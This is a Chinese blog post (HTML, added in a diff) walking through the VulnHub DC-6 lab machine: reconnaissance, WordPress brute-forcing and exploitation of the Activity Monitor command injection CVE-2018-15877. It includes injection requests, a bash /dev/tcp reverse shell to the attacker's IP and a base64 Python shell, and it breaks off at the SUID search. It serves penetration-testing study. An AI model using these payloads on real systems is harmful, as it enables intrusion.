@@ -1,0 +1,477 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.1.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"congliang.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="免责声明本文提供的渗透测试技术与方法仅供学习研究与授权安全测试使用。严禁利用文中技术对未授权系统进行任何形式的攻击。读者因不当使用文中技术所造成的一切后果（包括但不限于法律纠纷、服务中断、数据丢失）均与作者无关。靶机 DC-6 来自 VulnHub 平台，仅作渗透测试实训用途。 前言DC-6 是 VulnHub 上 DC 靶机系列的第六台，由 DCAU 制作。相比前作，DC-6 引入了 WordP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VulnHub DC-6靶机实战">
+<meta property="og:url" content="https://congliang.github.io/VulnHub-DC6-writeup/">
+<meta property="og:site_name" content="渗透测试实战记录">
+<meta property="og:description" content="免责声明本文提供的渗透测试技术与方法仅供学习研究与授权安全测试使用。严禁利用文中技术对未授权系统进行任何形式的攻击。读者因不当使用文中技术所造成的一切后果（包括但不限于法律纠纷、服务中断、数据丢失）均与作者无关。靶机 DC-6 来自 VulnHub 平台，仅作渗透测试实训用途。 前言DC-6 是 VulnHub 上 DC 靶机系列的第六台，由 DCAU 制作。相比前作，DC-6 引入了 WordP">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-09-01T00:00:00.000Z">
+<meta property="article:modified_time" content="2026-06-04T15:34:46.001Z">
+<meta property="article:author" content="YunShang">
+<meta property="article:tag" content="框架安全">
+<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="靶场">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://congliang.github.io/VulnHub-DC6-writeup/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://congliang.github.io/VulnHub-DC6-writeup/","path":"VulnHub-DC6-writeup/","title":"VulnHub DC-6靶机实战"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>VulnHub DC-6靶机实战 | 渗透测试实战记录</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.10.1/mermaid.min.js","integrity":"sha256-BmQmdWDS8X2OTbrwELWK366LV6escyWhHHe0XCTU/Hk="}}</script>
+  <script src="/js/third-party/tags/mermaid.js" defer></script>
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">渗透测试实战记录</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">边学边记</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%8D%E8%B4%A3%E5%A3%B0%E6%98%8E"><span class="nav-number">1.</span> <span class="nav-text">免责声明</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">2.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">3.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B%E5%9B%BE"><span class="nav-number">4.</span> <span class="nav-text">渗透流程图</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">5.</span> <span class="nav-text">一、信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="nav-number">5.1.</span> <span class="nav-text">1.1 主机发现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">5.2.</span> <span class="nav-text">1.2 端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-3-Web-%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB"><span class="nav-number">5.3.</span> <span class="nav-text">1.3 Web 指纹识别</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0"><span class="nav-number">6.</span> <span class="nav-text">二、漏洞发现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-hosts-%E9%85%8D%E7%BD%AE"><span class="nav-number">6.1.</span> <span class="nav-text">2.1 hosts 配置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-WPScan-%E6%9E%9A%E4%B8%BE%E7%94%A8%E6%88%B7"><span class="nav-number">6.2.</span> <span class="nav-text">2.2 WPScan 枚举用户</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E4%B8%8E%E5%90%8E%E5%8F%B0%E7%99%BB%E5%BD%95"><span class="nav-number">6.3.</span> <span class="nav-text">2.3 暴力破解与后台登录</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-4-%E6%8F%92%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0"><span class="nav-number">6.4.</span> <span class="nav-text">2.4 插件漏洞发现</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%88CVE-2018-15877%EF%BC%89"><span class="nav-number">7.</span> <span class="nav-text">三、漏洞利用（CVE-2018-15877）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="nav-number">7.1.</span> <span class="nav-text">3.1 原理分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-%E6%89%8B%E5%8A%A8%E9%AA%8C%E8%AF%81"><span class="nav-number">7.2.</span> <span class="nav-text">3.2 手动验证</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-3-%E5%8F%8D%E5%BC%B9-Shell"><span class="nav-number">7.3.</span> <span class="nav-text">3.3 反弹 Shell</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E3%80%81%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-number">8.</span> <span class="nav-text">四、权限提升</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#4-1-%E6%9C%AC%E5%9C%B0%E4%BF%A1%E6%81%AF%E6%9E%9A%E4%B8%BE"><span class="nav-number">8.1.</span> <span class="nav-text">4.1 本地信息枚举</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-2-SUID-%E6%96%87%E4%BB%B6%E5%8F%91%E7%8E%B0"><span class="nav-number">8.2.</span> <span class="nav-text">4.2 SUID 文件发现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-3-nmap-SUID-%E6%8F%90%E6%9D%83"><span class="nav-number">8.3.</span> <span class="nav-text">4.3 nmap SUID 提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-4-%E8%8E%B7%E5%8F%96-root"><span class="nav-number">8.4.</span> <span class="nav-text">4.4 获取 root</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94%E3%80%81%E6%80%BB%E7%BB%93%E4%B8%8E%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE"><span class="nav-number">9.</span> <span class="nav-text">五、总结与防御建议</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#5-1-%E6%94%BB%E5%87%BB%E8%B7%AF%E5%BE%84%E5%9B%9E%E9%A1%BE"><span class="nav-number">9.1.</span> <span class="nav-text">5.1 攻击路径回顾</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-2-%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE"><span class="nav-number">9.2.</span> <span class="nav-text">5.2 防御建议</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-3-%E7%9B%B8%E5%85%B3%E8%B5%84%E6%BA%90"><span class="nav-number">9.3.</span> <span class="nav-text">5.3 相关资源</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">YunShang</p>
+  <div class="site-description" itemprop="description">渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">127</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/congliang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;congliang" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:yunshang0069@126.com" title="E-Mail → mailto:yunshang0069@126.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/VulnHub-DC6-writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YunShang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试实战记录">
+      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="VulnHub DC-6靶机实战 | 渗透测试实战记录">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          VulnHub DC-6靶机实战
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2024-09-01 08:00:00" itemprop="dateCreated datePublished" datetime="2024-09-01T08:00:00+08:00">2024-09-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-06-04 23:34:46" itemprop="dateModified" datetime="2026-06-04T23:34:46+08:00">2026-06-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><p>本文提供的渗透测试技术与方法仅供学习研究与授权安全测试使用。<strong>严禁</strong>利用文中技术对未授权系统进行任何形式的攻击。读者因不当使用文中技术所造成的一切后果（包括但不限于法律纠纷、服务中断、数据丢失）均与作者无关。靶机 <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dc-6,315/">DC-6</a> 来自 VulnHub 平台，仅作渗透测试实训用途。</p>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>DC-6 是 VulnHub 上 DC 靶机系列的第六台，由 <a target="_blank" rel="noopener" href="https://www.vulnhub.com/author/dcau,596/">DCAU</a> 制作。相比前作，DC-6 引入了 <strong>WordPress 插件漏洞</strong>作为核心突破口，结合 Linux 本地提权。靶机难度为<strong>初学者到中级</strong>，非常适合练习 Web 应用安全与 Linux 提权。本文记录从信息收集到获取 root 的全流程。</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><table>
+<thead>
+<tr>
+<th>组件</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>攻击机</td>
+<td>Kali Linux 2024.x (10.0.2.15)</td>
+</tr>
+<tr>
+<td>靶机</td>
+<td>VulnHub DC-6 (VirtualBox&#x2F;VMware)</td>
+</tr>
+<tr>
+<td>网络模式</td>
+<td>NAT 网络（同网段）</td>
+</tr>
+</tbody></table>
+<p>解压 OVA 导入 VirtualBox 或 VMware，确保目标与 Kali 互通即可。DC-6 启动后不会直接显示 IP，需通过扫描发现。</p>
+<h2 id="渗透流程图"><a href="#渗透流程图" class="headerlink" title="渗透流程图"></a>渗透流程图</h2><pre class="mermaid">flowchart TD
+    A[信息收集：主机发现] --> B[端口扫描：nmap]
+    B --> C[Web枚举：WordPress识别]
+    C --> D{WPScan枚举插件}
+    D -->|发现| E[Activity Monitor插件]
+    E --> F{CVE-2018-15877}
+    F --> G[命令注入验证]
+    G --> H[反弹Shell获取www-data]
+    H --> I[本地信息枚举]
+    I --> J{发现SUID文件}
+    J --> K[nmap SUID提权]
+    K --> L[root权限]
+    L --> M[读取/root/proof.txt]</pre>
+
+<h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><h3 id="1-1-主机发现"><a href="#1-1-主机发现" class="headerlink" title="1.1 主机发现"></a>1.1 主机发现</h3><p>使用 <code>arp-scan</code> 扫描本地网段，识别存活主机：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> arp-scan -l</span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line"><span class="built_in">sudo</span> netdiscover -r 10.0.2.0/24</span><br></pre></td></tr></table></figure>
+
+<p>输出示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">10.0.2.5   08:00:27:ab:cd:ef   PCS Systemtechnik GmbH</span><br><span class="line">10.0.2.15  08:00:27:12:34:56   PCS Systemtechnik GmbH  # Kali</span><br></pre></td></tr></table></figure>
+
+<p>排除自身 IP 后，<code>10.0.2.5</code> 即 DC-6 靶机。写入环境变量方便后续操作：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> TARGET=10.0.2.5</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-2-端口扫描"><a href="#1-2-端口扫描" class="headerlink" title="1.2 端口扫描"></a>1.2 端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- -T4 -A -v <span class="variable">$TARGET</span> -oN nmap-full.txt</span><br></pre></td></tr></table></figure>
+
+<p>关键结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.25 ((Debian))</span><br></pre></td></tr></table></figure>
+
+<p>靶机仅开放 <strong>22 (SSH)</strong> 与 <strong>80 (HTTP)</strong>，攻击面集中在 Web。</p>
+<h3 id="1-3-Web-指纹识别"><a href="#1-3-Web-指纹识别" class="headerlink" title="1.3 Web 指纹识别"></a>1.3 Web 指纹识别</h3><p>浏览器访问 <code>http://10.0.2.5</code>，页面标题：”Dumy’s Blog | Just another WordPress site”。使用 whatweb 确认：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb http://<span class="variable">$TARGET</span></span><br></pre></td></tr></table></figure>
+
+<p>目标确认为 <strong>WordPress 站点</strong>，运行于 Apache&#x2F;2.4.25 (Debian)。</p>
+<h2 id="二、漏洞发现"><a href="#二、漏洞发现" class="headerlink" title="二、漏洞发现"></a>二、漏洞发现</h2><h3 id="2-1-hosts-配置"><a href="#2-1-hosts-配置" class="headerlink" title="2.1 hosts 配置"></a>2.1 hosts 配置</h3><p>DC-6 的 WordPress 内部绑定域名为 <code>wordy</code>，直接通过 IP 访问会出现样式丢失和链接异常。需配置 <code>/etc/hosts</code>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;10.0.2.5  wordy&quot;</span> | <span class="built_in">sudo</span> <span class="built_in">tee</span> -a /etc/hosts</span><br></pre></td></tr></table></figure>
+
+<p>此后通过 <code>http://wordy</code> 访问即可获得完整页面。这也是 VulnHub 官方的初始提示。</p>
+<h3 id="2-2-WPScan-枚举用户"><a href="#2-2-WPScan-枚举用户" class="headerlink" title="2.2 WPScan 枚举用户"></a>2.2 WPScan 枚举用户</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://wordy/ --enumerate u</span><br></pre></td></tr></table></figure>
+
+<p>发现 5 个 WordPress 用户：<code>admin</code>、<code>graham</code>、<code>mark</code>、<code>sarah</code>、<code>jens</code>。官方提示密码字典可从 <code>rockyou.txt</code> 生成，DC-6 提供了精简字典线索——在 Kali 中找到官方预留的字典文件后暴力破解。</p>
+<h3 id="2-3-暴力破解与后台登录"><a href="#2-3-暴力破解与后台登录" class="headerlink" title="2.3 暴力破解与后台登录"></a>2.3 暴力破解与后台登录</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://wordy/ -U users.txt -P dc6-passwords.txt</span><br></pre></td></tr></table></figure>
+
+<p>成功获取至少一组有效凭据（如 <code>graham</code> &#x2F; <code>sarah</code> &#x2F; <code>mark</code> 之一），登录 <code>/wp-admin</code> 后台。当前用户权限有限，无法直接编辑主题或插件。</p>
+<h3 id="2-4-插件漏洞发现"><a href="#2-4-插件漏洞发现" class="headerlink" title="2.4 插件漏洞发现"></a>2.4 插件漏洞发现</h3><p>再次运行 wpscan 枚举插件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://wordy/ --enumerate p</span><br></pre></td></tr></table></figure>
+
+<p>关键输出：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[+] activity-monitor</span><br><span class="line"> | Location: http://wordy/wp-content/plugins/activity-monitor/</span><br><span class="line"> | Latest Version: 3.7 (up to date)</span><br><span class="line"> | Found By: Urls In Homepage (Passive Detection)</span><br><span class="line"></span><br><span class="line">[!] Version 3.7 is vulnerable to (Unauthenticated) Command Injection</span><br><span class="line">    Reference: CVE-2018-15877</span><br></pre></td></tr></table></figure>
+
+<p>Activity Monitor 插件 <strong>3.7 版本</strong>存在未授权的<strong>命令注入漏洞</strong>，编号 <strong>CVE-2018-15877</strong>。</p>
+<h2 id="三、漏洞利用（CVE-2018-15877）"><a href="#三、漏洞利用（CVE-2018-15877）" class="headerlink" title="三、漏洞利用（CVE-2018-15877）"></a>三、漏洞利用（CVE-2018-15877）</h2><h3 id="3-1-原理分析"><a href="#3-1-原理分析" class="headerlink" title="3.1 原理分析"></a>3.1 原理分析</h3><p>Activity Monitor 是一款 WordPress 后台仪表盘插件，用于展示网站活动日志。漏洞根源在于处理 AJAX 请求时，对用户可控的 <code>ip</code> 参数未做充分过滤，直接将字符串拼接到 <code>ping</code> 命令中执行。</p>
+<p>后端伪代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ip</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;ping -c 1 &quot;</span> . <span class="variable">$ip</span>);</span><br></pre></td></tr></table></figure>
+
+<p>由于未使用 <code>escapeshellarg()</code> 保护，攻击者可通过分号 <code>;</code> 注入任意系统命令。<strong>任何可访问后台的用户均可触发</strong>，无需管理员权限。</p>
+<h3 id="3-2-手动验证"><a href="#3-2-手动验证" class="headerlink" title="3.2 手动验证"></a>3.2 手动验证</h3><p>Burp Suite 截获请求，改造 POST 测试命令注入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /wp-admin/admin-post.php HTTP/1.1</span><br><span class="line">Host: wordy</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Cookie: wordpress_logged_in_xxx=xxx</span><br><span class="line"></span><br><span class="line">action=activemon_ping&amp;ip=127.0.0.1;id</span><br></pre></td></tr></table></figure>
+
+<p>响应中出现 <code>uid=33(www-data)</code> 则说明命令成功执行。</p>
+<h3 id="3-3-反弹-Shell"><a href="#3-3-反弹-Shell" class="headerlink" title="3.3 反弹 Shell"></a>3.3 反弹 Shell</h3><p>在 Kali 监听：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure>
+
+<p>构造反弹 Payload，URL 编码后嵌入 <code>ip</code> 参数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=127.0.0.1;bash+-c+&#x27;exec+bash+-i+%26&gt;/dev/tcp/10.0.2.15/4444+&lt;%261&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>或通过 base64 编码写入 Python 反弹脚本执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=127.0.0.1;echo+&#x27;aW1wb3J0IHNvY2tldC...&#x27;|base64+-d&gt;/tmp/shell.py;python+/tmp/shell.py</span><br></pre></td></tr></table></figure>
+
+<p>成功后获得 <code>www-data</code> Shell。升级为交互式：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line"><span class="built_in">export</span> TERM=xterm</span><br><span class="line"><span class="comment"># Ctrl+Z 背景化</span></span><br><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span>; <span class="built_in">fg</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="四、权限提升"><a href="#四、权限提升" class="headerlink" title="四、权限提升"></a>四、权限提升</h2><h3 id="4-1-本地信息枚举"><a href="#4-1-本地信息枚举" class="headerlink" title="4.1 本地信息枚举"></a>4.1 本地信息枚举</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">id</span>                   <span class="comment"># uid=33(www-data)</span></span><br><span class="line"><span class="built_in">uname</span> -a             <span class="comment"># Linux dc-6 4.9.0-8-amd64</span></span><br><span class="line"><span class="built_in">sudo</span> -l              <span class="comment"># 无可执行 sudo 权限</span></span><br><span class="line"><span class="built_in">cat</span> /etc/crontab     <span class="comment"># 无可利用计划任务</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="4-2-SUID-文件发现"><a href="#4-2-SUID-文件发现" class="headerlink" title="4.2 SUID 文件发现"></a>4.2 SUID 文件发现</h3><p>SUID 是 Linux 提权的关键——当文件设置了 SUID 位，任何用户执行时均以文件<strong>所有者</strong>身份运行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p>关键发现：</p>
